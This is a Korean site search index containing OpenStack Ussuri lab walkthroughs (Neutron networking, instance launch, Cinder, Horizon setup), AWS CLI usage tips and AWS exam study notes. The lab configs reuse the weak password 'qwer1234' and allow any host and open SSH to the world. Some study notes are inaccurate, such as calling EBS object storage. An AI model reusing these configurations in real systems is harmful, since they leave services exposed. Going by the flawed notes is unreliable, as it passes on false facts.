controller ~(keystone)\u0026gt; openstack network create int --provider-network-type vxlan\r+---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| admin_state_up | UP |\r| availability_zone_hints | |\r| availability_zones | |\r| created_at | 2020-08-07T00:05:58Z |\r| description | |\r| dns_domain | None |\r| id | 0edec63e-cc62-4e93-8962-d0ad2df27bc8 |\r| ipv4_address_scope | None |\r| ipv6_address_scope | None |\r| is_default | False |\r| is_vlan_transparent | None |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| mtu | 1450 |\r| name | int |\r| port_security_enabled | True |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| provider:network_type | vxlan |\r| provider:physical_network | None |\r| provider:segmentation_id | 1 |\r| qos_policy_id | None |\r| revision_number | 1 |\r| router:external | Internal |\r| segments | None |\r| shared | False |\r| status | ACTIVE |\r| subnets | |\r| tags | |\r| updated_at | 2020-08-07T00:05:58Z |\r+---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack subnet create int-sub --network int \\\r--subnet-range 1.1.1.0/24 --gateway 1.1.1.1 \\\r--dns-nameserver 8.8.8.8\r+----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| allocation_pools | 1.1.1.2-1.1.1.254 |\r| cidr | 1.1.1.0/24 |\r| created_at | 2020-08-07T00:06:25Z |\r| description | |\r| dns_nameservers | 8.8.8.8 |\r| dns_publish_fixed_ip | None |\r| enable_dhcp | True |\r| gateway_ip | 1.1.1.1 |\r| host_routes | |\r| id | 800bc5af-45e9-4719-8969-4c154bc111d6 |\r| ip_version | 4 |\r| ipv6_address_mode | None |\r| ipv6_ra_mode | None |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| name | int-sub |\r| network_id | 0edec63e-cc62-4e93-8962-d0ad2df27bc8 |\r| prefix_length | None |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| revision_number | 0 |\r| segment_id | None |\r| service_types | |\r| subnetpool_id | None |\r| tags | |\r| updated_at | 2020-08-07T00:06:25Z |\r+----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack router add subnet router int-sub\r$ controller ~(keystone)\u0026gt; openstack network create \\\r--provider-physical-network physnet1 \\\r--provider-network-type flat --external ext\r+---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| admin_state_up | UP |\r| availability_zone_hints | |\r| availability_zones | |\r| created_at | 2020-08-07T00:06:47Z |\r| description | |\r| dns_domain | None |\r| id | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 |\r| ipv4_address_scope | None |\r| ipv6_address_scope | None |\r| is_default | False |\r| is_vlan_transparent | None |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| mtu | 1500 |\r| name | ext |\r| port_security_enabled | True |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| provider:network_type | flat |\r| provider:physical_network | physnet1 |\r| provider:segmentation_id | None |\r| qos_policy_id | None |\r| revision_number | 1 |\r| router:external | External |\r| segments | None |\r| shared | False |\r| status | ACTIVE |\r| subnets | |\r| tags | |\r| updated_at | 2020-08-07T00:06:47Z |\r+---------------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack subnet create ext-sub \\\r--network ext --subnet-range 192.168.10.0/24 \\\r--allocation-pool start=192.168.10.150,end=192.168.10.200 \\\r--gateway 192.168.10.2 --dns-nameserver 8.8.8.8\r+----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| allocation_pools | 192.168.10.150-192.168.10.200 |\r| cidr | 192.168.10.0/24 |\r| created_at | 2020-08-07T00:07:21Z |\r| description | |\r| dns_nameservers | 8.8.8.8 |\r| dns_publish_fixed_ip | None |\r| enable_dhcp | True |\r| gateway_ip | 192.168.10.2 |\r| host_routes | |\r| id | 31a92331-f102-4c4e-8c02-f97baa9eab28 |\r| ip_version | 4 |\r| ipv6_address_mode | None |\r| ipv6_ra_mode | None |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| name | ext-sub |\r| network_id | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 |\r| prefix_length | None |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| revision_number | 0 |\r| segment_id | None |\r| service_types | |\r| subnetpool_id | None |\r| tags | |\r| updated_at | 2020-08-07T00:07:21Z |\r+----------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack router set router --external-gateway ext\r$ controller ~(keystone)\u0026gt; openstack network rbac list\r+--------------------------------------+-------------+--------------------------------------+\r| ID | Object Type | Object ID |\r+--------------------------------------+-------------+--------------------------------------+\r| 4e8ebe0b-60f0-485c-8696-74378068c844 | network | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 |\r+--------------------------------------+-------------+--------------------------------------+\r$ controller ~(keystone)\u0026gt; wget http://cloud-images.ubuntu.com/releases/18.04/release/ubuntu-18.04-server-cloudimg-amd64.img -P /var/kvm/images\r$ controller ~(keystone)\u0026gt; openstack image create \u0026quot;Ubuntu1804\u0026quot; --file /var/kvm/images/ubuntu-18.04-server-cloudimg-amd64.img --disk-format qcow2 --container-format bare --public\r# Ubuntu18.04 이미지를 다운로드 후, 등록합니다.\r$ controller ~(keystone)\u0026gt; openstack security group create all-port\r+-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| created_at | 2020-08-07T00:10:31Z |\r| description | all-port |\r| id | 97224218-b304-4076-9645-d68092a9366a |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| name | all-port |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| revision_number | 1 |\r| rules | created_at='2020-08-07T00:10:32Z', direction='egress', ethertype='IPv6', id='333de7e9-5c1b-4b2f-bb0e-2da1b878abb6', updated_at='2020-08-07T00:10:32Z' |\r| | created_at='2020-08-07T00:10:32Z', direction='egress', ethertype='IPv4', id='644e18e1-4f4e-42ad-bef8-937e47254a27', updated_at='2020-08-07T00:10:32Z' |\r| stateful | True |\r| tags | [] |\r| updated_at | 2020-08-07T00:10:32Z |\r+-----------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack security group rule create --protocol icmp --ingress all-port\r+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| created_at | 2020-08-07T00:13:31Z |\r| description | |\r| direction | ingress |\r| ether_type | IPv4 |\r| id | 27688481-047b-4fc0-948c-de109e46d7f5 |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| name | None |\r| port_range_max | None |\r| port_range_min | None |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| protocol | icmp |\r| remote_group_id | None |\r| remote_ip_prefix | 0.0.0.0/0 |\r| revision_number | 0 |\r| security_group_id | 97224218-b304-4076-9645-d68092a9366a |\r| tags | [] |\r| updated_at | 2020-08-07T00:13:31Z |\r+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack security group rule create --protocol tcp --dst-port 22:22 all-port\r+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r| created_at | 2020-08-07T00:13:36Z |\r| description | |\r| direction | ingress |\r| ether_type | IPv4 |\r| id | da2afd20-818a-4bfe-9017-c837b2bf30ec |\r| location | cloud='', project.domain_id=, project.domain_name='default', project.id='c76211c24a1f460ca67274d655d46725', project.name='admin', region_name='', zone= |\r| name | None |\r| port_range_max | 22 |\r| port_range_min | 22 |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| protocol | tcp |\r| remote_group_id | None |\r| remote_ip_prefix | 0.0.0.0/0 |\r| revision_number | 0 |\r| security_group_id | 97224218-b304-4076-9645-d68092a9366a |\r| tags | [] |\r| updated_at | 2020-08-07T00:13:36Z |\r+-------------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; ssh-keygen -q -N \u0026quot;\u0026quot;\r$ controller ~(keystone)\u0026gt; openstack keypair create --public-key ~/.ssh/id_rsa.pub MyKey\r+-------------+-------------------------------------------------+\r| Field | Value |\r+-------------+-------------------------------------------------+\r| fingerprint | a3:8f:44:f6:e1:4e:da:a0:90:f1:5d:dc:6a:8b:ad:76 |\r| name | MyKey |\r| user_id | 57ce8f772e374a7c9282f2674fda1ba7 |\r+-------------+-------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack flavor create --ram 1024 --disk 10 --vcpus 1 m1.small\r+----------------------------+--------------------------------------+\r| Field | Value |\r+----------------------------+--------------------------------------+\r| OS-FLV-DISABLED:disabled | False |\r| OS-FLV-EXT-DATA:ephemeral | 0 |\r| disk | 10 |\r| id | dabfebd4-cd05-4cec-9567-78b8c9e3d6b6 |\r| name | m1.small |\r| os-flavor-access:is_public | True |\r| properties | |\r| ram | 1024 |\r| rxtx_factor | 1.0 |\r| swap | |\r| vcpus | 1 |\r+----------------------------+--------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack server create --image Ubuntu1804 --flavor m1.small --key Mykey --network int --security-group all-port Ubuntu\r$ controller ~(keystone)\u0026gt; openstack floating ip create ext\r+---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\r| Field | Value |\r+---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\r| created_at | 2020-08-07T00:16:15Z |\r| description | |\r| dns_domain | None |\r| dns_name | None |\r| fixed_ip_address | None |\r| floating_ip_address | 192.168.10.191 |\r| floating_network_id | 68e5adb0-a8c4-473b-88a9-fdaaf6f12ec2 |\r| id | 409a4724-1e13-4150-a2e1-6b3a205c4ff6 |\r| location | Munch({'cloud': '', 'region_name': '', 'zone': None, 'project': Munch({'id': 'c76211c24a1f460ca67274d655d46725', 'name': 'admin', 'domain_id': None, 'domain_name': 'default'})}) |\r| name | 192.168.10.191 |\r| port_details | None |\r| port_id | None |\r| project_id | c76211c24a1f460ca67274d655d46725 |\r| qos_policy_id | None |\r| revision_number | 0 |\r| router_id | None |\r| status | DOWN |\r| subnet_id | None |\r| tags | [] |\r| updated_at | 2020-08-07T00:16:15Z |\r+---------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack server add floating ip Ubuntu 192.168.10.191\r$ controller ~(keystone)\u0026gt; "});index.add({'id':111,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-07/','title':"OpenStack Ussuri : Cinder",'content':"OpenStack Ussuri   ----------------------- ----------------------- -----------------------\r| [ Controller Node ] | | [ Compute Node ] | | [ Network Node ] | | | | Libvirt | | Open vSwitch |\r| MariaDB RabbitMQ | | Nova compute | | L2 Agent |\r| Memcached Keystone | | Open vSwitch | | L3 Agent |\r| httpd Cinder API | | L2 Agent | | metadata agent |\r| Nova-API Compute | | Cinder-volume | -----------------------\r| L2 agent L3 agent | -----------------------\r| metadata agent |\r| Neutron Server | -----------------------  OpenStack Ussuri : Cinder   Cinder는 OpenStack에서 전체적인 볼륨, 디스크를 관리하는 서비스입니다. Cinder에 대한 자세한 설명은 Cinder를 참조해주세요.     Cinder service 및 User 생성  $ controller ~(keystone)\u0026gt; openstack user create --domain default --project service --password qwer1234 cinder\r+---------------------+----------------------------------+\r| Field | Value |\r+---------------------+----------------------------------+\r| default_project_id | 7c10c02365be496fb47f12bfd40fe4a7 |\r| domain_id | default |\r| enabled | True |\r| id | 1f9dbcbb529a45c28b5bb8b035ea277a |\r| name | cinder |\r| options | {} |\r| password_expires_at | None |\r+---------------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack role add --project service --user cinder admin\r$ controller ~(keystone)\u0026gt; openstack service create --name cinderv3 --description \u0026#34;OpenStack Block Storage\u0026#34; volumev3\r+-------------+----------------------------------+\r| Field | Value |\r+-------------+----------------------------------+\r| description | OpenStack Block Storage |\r| enabled | True |\r| id | 225ceadb699d4e79adf30769cd872fef |\r| name | cinderv3 |\r| type | volumev3 |\r+-------------+----------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne volumev3 public http://controller:8776/v3/%\\(tenant_id\\)s\r+--------------+-----------------------------------------+\r| Field | Value |\r+--------------+-----------------------------------------+\r| enabled | True |\r| id | 6bf917232caa43eab3b83959fb19cb45 |\r| interface | public |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 225ceadb699d4e79adf30769cd872fef |\r| service_name | cinderv3 |\r| service_type | volumev3 |\r| url | http://controller:8776/v3/%(tenant_id)s |\r+--------------+-----------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne volumev3 internal http://controller:8776/v3/%\\(tenant_id\\)s\r+--------------+-----------------------------------------+\r| Field | Value |\r+--------------+-----------------------------------------+\r| enabled | True |\r| id | c5987fc3d9eb4fb79a2e8cf73a274936 |\r| interface | internal |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 225ceadb699d4e79adf30769cd872fef |\r| service_name | cinderv3 |\r| service_type | volumev3 |\r| url | http://controller:8776/v3/%(tenant_id)s |\r+--------------+-----------------------------------------+\r$ controller ~(keystone)\u0026gt; openstack endpoint create --region RegionOne volumev3 admin http://controller:8776/v3/%\\(tenant_id\\)s\r+--------------+-----------------------------------------+\r| Field | Value |\r+--------------+-----------------------------------------+\r| enabled | True |\r| id | eff2398584944c0fa7575d1991d725fe |\r| interface | admin |\r| region | RegionOne |\r| region_id | RegionOne |\r| service_id | 225ceadb699d4e79adf30769cd872fef |\r| service_name | cinderv3 |\r| service_type | volumev3 |\r| url | http://controller:8776/v3/%(tenant_id)s |\r+--------------+-----------------------------------------+\r# Cinder의 Endpoint를 생성합니다.\r   Cinder 유저의 DB를 생성합니다.  $ controller\u0026gt; mysql -u root -p\r$ MariaDB\u0026gt; create database cinder; $ MariaDB\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;localhost\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;%\u0026#39; identified by \u0026#39;qwer1234\u0026#39;; $ MariaDB\u0026gt; flush privileges; $ MariaDB\u0026gt; exit;\r   Cinder 설치  $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-cinder\r# cinder 및 관련 모듈을 설치합니다.\r$ controller\u0026gt; vi /etc/cinder/cinder.conf\r[DEFAULT]\rmy_ip = controller\rlog_dir = /var/log/cinder\rstate_path = /var/lib/cinder\rauth_strategy = keystone\rtransport_url = rabbit://openstack:qwer1234@controller\renable_v3_api = True\r[database]\rconnection = mysql+pymysql://cinder:qwer1234@controller/cinder\r[keystone_authtoken]\rwww_authenticate_uri = http://controller:5000\rauth_url = http://controller:5000\rmemcached_servers = controller:11211\rauth_type = password\rproject_domain_name = default\ruser_domain_name = default\rproject_name = service\rusername = cinder\rpassword = qwer1234\r[oslo_concurrency]\rlock_path = $state_path/tmp\r$ controller\u0026gt; su -s /bin/bash cinder -c \u0026#34;cinder-manage db sync\u0026#34;\r$ controller\u0026gt; systemctl enable --now openstack-cinder-api openstack-cinder-scheduler\r# cinder DB를 임포트 시키고, 서비스를 등록합니다.\r$ controller\u0026gt; echo \u0026#34;export OS_VOLUME_API_VERSION=3\u0026#34; \u0026gt;\u0026gt; ~/admin_key\r$ controller\u0026gt; source ~/admin_key\r# key파일을 수정합니다.\r   Cinder compute node 설치  $ compute\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-cinder targetcli\r# cinder 및 관련 모듈을 설치합니다.\r$ compute\u0026gt; fdisk ...\r# LVM의 타입으로 파티션을 추가합니다.\r# cinder 이름으로 vg를 생성합니다.\r$ controller\u0026gt; scp /etc/cinder/cinder.conf compute:/etc/cinder/cinder.conf $ compute\u0026gt; vi /etc/cinder/cinder.conf\r[default]\rmy_ip = compute\r...\r...\renabled_backends = lvm\r[lvm]\rtarget_helper = lioadm\rtarget_protocol = iscsi\rtarget_ip_address = compute\rvolume_group = cinder\rvolume_driver = cinder.volume.drivers.lvm.LVMVolumeDriver\rvolumes_dir = $state_path/volumes\r$ compute\u0026gt; vi /etc/nova/nova.conf\r[cinder]\ros_region_name = RegionOne\r$ compute\u0026gt; systemctl restart openstack-nova-compute\r$ compute\u0026gt; systemctl enable --now openstack-cinder-volume\r$ compute\u0026gt; vi iscsiadm.te\r$ compute\u0026gt; module iscsiadm 1.0;\rmodule iscsiadm 1.0;\rrequire {\rtype iscsid_t;\rclass capability dac_override;\r}\r#============= iscsid_t ==============\rallow iscsid_t self:capability dac_override;\r$ compute\u0026gt; checkmodule -m -M -o iscsiadm.mod iscsiadm.te\r$ compute\u0026gt; semodule_package --outfile iscsiadm.pp --module iscsiadm.mod\r$ compute\u0026gt; semodule -i iscsiadm.pp\r$ compute\u0026gt; firewall-cmd --add-service=iscsi-target --permanent\r$ compute\u0026gt; firewall-cmd --reload\r# SELinux 및 방화벽을 설정합니다.\r   확인 $ controller ~/(keystone)\u0026gt; openstack volume list\r+------------------+-------------+------+---------+-------+----------------------------+\r| Binary | Host | Zone | Status | State | Updated At |\r+------------------+-------------+------+---------+-------+----------------------------+\r| cinder-scheduler | controller | nova | enabled | up | 2020-08-07T01:29:22.000000 |\r| cinder-volume | compute@lvm | nova | enabled | up | 2020-08-07T01:29:22.000000 |\r+------------------+-------------+------+---------+-------+----------------------------+\r$ controller ~/(keystone)\u0026gt; openstack volume create --size 1 test\r+---------------------+--------------------------------------+\r| Field | Value |\r+---------------------+--------------------------------------+\r| attachments | [] |\r| availability_zone | nova |\r| bootable | false |\r| consistencygroup_id | None |\r| created_at | 2020-08-07T01:46:06.000000 |\r| description | None |\r| encrypted | False |\r| id | aa07bf85-424d-478c-ae52-648ddc588465 |\r| migration_status | None |\r| multiattach | False |\r| name | test |\r| properties | |\r| replication_status | None |\r| size | 1 |\r| snapshot_id | None |\r| source_volid | None |\r| status | creating |\r| type | __DEFAULT__ |\r| updated_at | None |\r| user_id | 57ce8f772e374a7c9282f2674fda1ba7 |\r+---------------------+--------------------------------------+\r$ controller ~/(keystone)\u0026gt; openstack volume list\r+--------------------------------------+------+-----------+------+-------------+\r| ID | Name | Status | Size | Attached to |\r+--------------------------------------+------+-----------+------+-------------+\r| aa07bf85-424d-478c-ae52-648ddc588465 | test | available | 1 | |\r+--------------------------------------+------+-----------+------+-------------+\r$ controller ~/(keystone)\u0026gt; $ controller ~/(keystone)\u0026gt;   "});index.add({'id':112,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-08/','title':"OpenStack Ussuri : Horizon",'content':"OpenStack : Horizon  OpenStack : Horizon   Horizon은 openstack에서 GUI 환경을 제공해주는 서비스입니다. Horizon에 대한 자세한 설명은 Horizon을 참조해주세요.   $ controller\u0026gt; dnf --enablerepo=centos-openstack-ussuri,PowerTools,epel -y install openstack-dashboard\r$ controller\u0026gt; vi /etc/openstack-dashboard/local_settings\rALLOWED_HOSTS = [\u0026#39;*\u0026#39;,\u0026#39;\u0026#39;]\r# 모든 host의 접속이 가능하게 설정합니다.\rCACHES = {\r\u0026#39;default\u0026#39;: {\r\u0026#39;BACKEND\u0026#39;: \u0026#39;django.core.cache.backends.memcached.MemcachedCache\u0026#39;,\r\u0026#39;LOCATION\u0026#39;: \u0026#39;controller:11211\u0026#39;,\r},\r}\rSESSION_ENGINE = \u0026#34;django.contrib.sessions.backends.cache\u0026#34;\rOPENSTACK_HOST = \u0026#34;controller\u0026#34;\rOPENSTACK_KEYSTONE_URL = \u0026#34;http://controller:5000/v3\u0026#34;\r# openstack host와 SESSION 서버의 host를 지정합니다.\rTIME_ZONE = \u0026#34;Asia/Seoul\u0026#34;\r# 시간을 지정합니다.\rWEBROOT = \u0026#39;/dashboard/\u0026#39;\rLOGIN_URL = \u0026#39;/dashboard/auth/login/\u0026#39;\rLOGOUT_URL = \u0026#39;/dashboard/auth/logout/\u0026#39;\rLOGIN_REDIRECT_URL = \u0026#39;/dashboard/\u0026#39;\rOPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True\rOPENSTACK_KEYSTONE_DEFAULT_DOMAIN = \u0026#39;Default\u0026#39;\rOPENSTACK_API_VERSIONS = {\r\u0026#34;identity\u0026#34;: 3,\r\u0026#34;volume\u0026#34;: 3,\r\u0026#34;compute\u0026#34;: 2,\r}\r# 끝에 추가합니다.\r$ controller\u0026gt; vi /etc/httpd/conf.d/openstack-dashboard.conf\r....\r....\rWSGIApplicationGroup %{GLOBAL}\r# 상단에 추가합니다.\r$ controller\u0026gt; systemctl restart httpd\r# httpd를 재 시작합니다.\r  "});index.add({'id':113,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-09/','title':"OpenStack Ussuri : Swift",'content':"OpenStack Ussuri : Swift  OpenStack Ussuri : Swift  "});index.add({'id':114,'href':'/docs/cloudcomputing/openstacktraining/openstack-ussuri-10/','title':"OpenStack Ussuri : Heat",'content':"OpenStack Ussuri : Heat  OpenStack Ussuri : Heat  "});index.add({'id':115,'href':'/docs/cloudcomputing/%EC%A0%95%EB%A6%AC%EC%A0%84/test/','title':"Test",'content':"awscli awscli 는 AWS Command Line Interface 의 약어입니다. 설치하면 이후 s3 관련 작업을 terminal command 로 할 수 있습니다.\n설치는 pip install 로 가능합니다. Python 2.6x 혹은 Python 2.7x 이상이 필요하였는데, 저는 Python 3.x 만 이용하므로 버전은 자세히 보지 않았습니다.\npip install awscli 설치 후 help 명령어를 입력하여 awscli 가 설치되었는지 확인도 해봅니다.\naws help aws cli 를 이용하기 전에 앞서 만든 AWS IAM 사용자를 추가해야 합니다. aws configure 를 실행시킵니다.\naws configure 네 개의 항목이 나오는데, access key id 와 secret access key 는 앞서 다운로드 받은 csv 파일 안에 있습니다. region name 은 default region 을 설정하는 것으로, 아시아 (서울)은 ap-northeast-2 입니다. 마지막은 enter 를 눌러 넘어갑니다.\nAWS Access Key ID [None]: AWS Secret Access Key [None]: Default region name [None]: Default output format [None]: 제대로 configure 가 실행 되었는지 확인합니다. 내 계정의 버킷 리스트나 한 버킷 내 파일 리스트를 살펴볼 수 있습니다.\n내 계정의 버킷 리스트 aws s3 ls\n내 버킷 내 파일 리스트 aws s3 ls s3://mybucket/ 파일 복사는 aws s3 cp 이후 source, destination 순으로 입력합니다. S3 의 주소는 s3:// 로 시작합니다.\naws s3 cp localfile s3://[BUCKETNAME]/[FILENAME] 여러 개의 파일이나 폴더를 recursive 하게 복사할 때에는 sync 를 이용할 수 있습니다.\naws s3 sync SOURCE_DIR s3://DEST_BUCKET/ 업로드 하는 파일을 모두가 읽을 수 있도록 권한을 설정하려면 \u0026ndash;acl public-read 옵션을 추가합니다.\naws s3 sync SOURCE s3://DESTINATION \u0026ndash;acl public-read 데이터 백업을 위해서라면 Storage class 를 Standard 로 할 필요는 없습니다. Standard IA 는 자주 접속하지는 않지만, 중요한 데이터를 저장하는 storage class 입니다. 이를 이용하려면 다음처럼 –storage-class 옵션을 부여합니다. 더 많은 cp 관련 옵션은 여기에 있습니다.\naws s3 sync SOURCE_DIR s3://DEST_BUCKET/ \u0026ndash;storage-class STANDARD_IA\n시험 정리   S3와 S3-IA는 내구성은 동일하지만 가용성은 S3가 9가 큼 ( S3의 가용성은 99.99이며 S3-IA의 가용성은 99.9 )\n  데이터가 로컬에 존재하는 경우 스토리지 게이트웨이가 최상의 옵션을 제공\n  개별 객체의 최대크기는 5TB, AWS는 100MB보다 큰 모든 객체에 멀티 파트 업로드를 사용하는 것이 용이\n  S3의 최종 일관성은 삭제 및 기존 개체를 덮어 씌우는 것\n  S3의 저장할 수 있는 가장 작은 파일은 0byte이지만, 모든 객체가 128KB 이상인 것처럼 요금이 청구되어짐\n  S3를 프로그래밍 방식으로 업데이트 하면 https://[ 리전 주소 ] [ 버킷 주소 ]/ 호스팅 중일 경우 반대\n  S3 One Zone-IA의 가용성은 99.5 S3-IA는 99.9% S3는 99.99%\n  S3와 IAM은 전역 적으로 표시 됨 ( 리전 구분 X )\n  EBS는 객체 기반 스토리지 및 다양한 SSD 및 자기 옵션으로 제공\n  AMI는 지역변수\n  인스턴스가 종료되면 EBS의 루트 볼륨도 종료되어짐\n  EBS는 증분백업\n  EBS 볼륨은 하나의 한 인스턴스에만 연결이 가능\n  메타 데이턴느 인증서와 태그를 통해서 추가 됨\n  개별 인스턴스는 특정 가용성 존 B에서 프로비저닝 됨\n  여러 가용영역에 배치 가능한 것은 스프레드배치 그룹\n  VPN과 연결을 구축하기 위해 사용되는 서비스는 고객 게이트웨이\n  일반적으로 VPn 연결은 중복성을 위해 두 개의 서로 다른 터널을 사용\n  스토리지 나오면 걍 스토리지 게이트웨이\n  NFS 기반 백업 시스템은 파일 게이트웨이\n  테이프 백업 시스템이 나오면 테이프 게이트웨이 ( Amazon Glacier )\n  저장된 볼륨 게이트웨이는 S3로 비동기적으로 백업, 네트워크 대기 시간이 최소화\n  캐시 된 볼륨 게이트웨이는 전체 데이터 세트를 S3에 유지하면서 가장 일반적으로 엑세스되는 데이터를 로컬에 저장\n  전체 데이터 세트가 필요한 경우 저장된 볼륨 게이트웨이, 특정시간의 우선 순위인 게이트웨이는 캐시 게이트웨이\n  S3 OneZone-IA 의 내구성은 99.999999999 %\n  S3 개체는 키- 값 쌍 기반\n  S3 버킷에 접근하는 방법은 FTP X SFTP X REST O, 콘솔 O\n  S3는 앱 사용량이 많은 시간에 자동으로 확장되도록 설계 되어짐\n  S3는 AWS 네트워크에서 균등하게 확장되는 경향이 있음\n  멀티 파트 업로드는 100MB보다 큰 파일일 경우 사용 됨\n  미리 서명 된 URL은 URL 작성자가 제공한 특정 개체와 관련된 권한이 있음\n  사전 서명 된 URL을 사용하면 AWS 자격 증명 없이도 개인 S3 버킷에 엑세스 가능\n  S3에서 PUT에 대한 일관성은 읽기 쓰기 일관성 후\n  S3의 초당 PUT은 3500개\n  S3의 버킷 엑세스 포인트는 가상 호스트 스타일, 경로 스타일\n  S3에서 지원하는 일관성 모델은 쓰기 일관성 후 읽기, 최종 일관성\n  S3 객체가 실수로 삭제되지 않도록 하는 권한 MFA ( Multi )\n  MFA delete의 HTTP 헤더는 x-amz-mfa\n  MFA 삭제는 루트계정만 가능\n  객체 메타 데이터를 추가하는 메커니즘은 태그\n  S3 버킷에서 버전 관리가 된 후에는 해제가 되지 않음\n  CloudFront가 호출한 정보 소스는 오리진 서버\n  엣지 로케이션 \u0026gt; 가용영역 \u0026gt; 리전\n  TTL ( Time to LIve )는 캐시되는 시간\n  엣지 로케이션의 캐시되는 시간은 최대 24시간\n  별도의 리전에서 생성하는 것을 내결함성\n  S3, EC2는 엑셀레이터가 있다\n  S3 Transfer Acceleration의 이점은 지리적으로 가장 멀리 있는 사용자\n  Snowball은 어떤 언어도 지원하지 않음 ( 전송만 수행 )\n  Elastic Beanstalk가 지원하는 것은 도커, Node.js\n  파일의 다양한 형식으로 변환하는 것은 Elastic Transcoder의 기능\n  여러 데이터 소스에서 비즈니스 인텔리전스를 수집하는 데 이상적인 AWS는 QuickSight\n  환경의 특정 이벤트를 기반으로 경고 및 경보를 전송하는 AWS 서비스는 SNS\n  AWS Cognito 사인온 뿐만이 아닌 웹 애플리케이션 사용자 가입, 로그인 및 엑세스 제어를 수행 가능 facebook, google과 같은 자격 증명 공급자 역할 가능\n  EMR ( Elastic MapReduce ) 대용량 데이터 세트의 데이터 처리 및 분석을 제공\n  cloud9은 IDE로 설계된 개발자 환경\n  Amazon Workspaces는 데스크톱 서비스를 의미\n  Kinesis는 대규모 데이터 스트림을 처리하는 데이터 분석 서비스\n  Elastic Transcoder란 미디어 서비스로 다양한 장치에 적합한 형식으로 비디오를 처리\n  OpsWorks는 운영 관리 서비스로 Puppet 및 chef와 같은 도구의 통합이 가능\n  Lex는 음성 인식 및 대화 봇을 구축하기 위한 Amazon 서비스\n  NAS = EFS\n  캐싱 엔진은 = memcached\n  AWS가 제공하는 모든 것에 예약 인스턴스 생성가능\n  다중 AZ로 구성된 RDS에서는 수동으로 장애 조치 및 기본 영역에 도달할 수 없을 경우 장애 조치 시작\n  OLAP란 온라인 분석처리를 의미 ( Redshift의 주요 예시 )\n  OLTP란 온라인 거래처리를 의미 ( AWS의 관계형 데이터베이스 도메인 )\n  EMR은 빅데이터 처리에 유리\n  Kinesis는 실시간 분석에 유리\n  QuickSight는 응용프로그램을 시각적으로 관측이 가능\n  아테나는 대화형 분석시스템으로, 대화식 측면을 사용하고 데이터를 분석하며 표준 SQL 쿼리를 사용\n  EMR가 함께 사용되는 일반적인 프레임워크는 하둡과 스파크\n  오로라는 기본적으로 데이터 사본을 3개의 가용 영역에 